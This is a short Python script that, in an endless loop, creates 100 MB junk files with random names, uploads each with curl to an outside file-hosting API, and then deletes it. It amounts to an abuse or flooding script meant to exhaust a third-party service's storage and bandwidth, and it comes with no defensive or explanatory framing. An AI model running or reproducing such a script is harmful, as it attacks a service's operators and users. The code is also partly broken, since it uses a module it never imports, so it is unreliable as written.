import os
import time
low_word = "abcdefghijklkmnopqrstuvwxyz"
username_for = low_word
long_username = 12

while True:
    usernamerepl = "".join(random.sample(username_for, long_username))
    os.system("fallocate -l 100M "+usernamerepl)
    time.sleep(1)
    os.system("curl --form myFile='@"+usernamerepl+"' https://cdn.dnxrg.net/api/upload")
    time.sleep(1)
    os.system("rm "+usernamerepl)
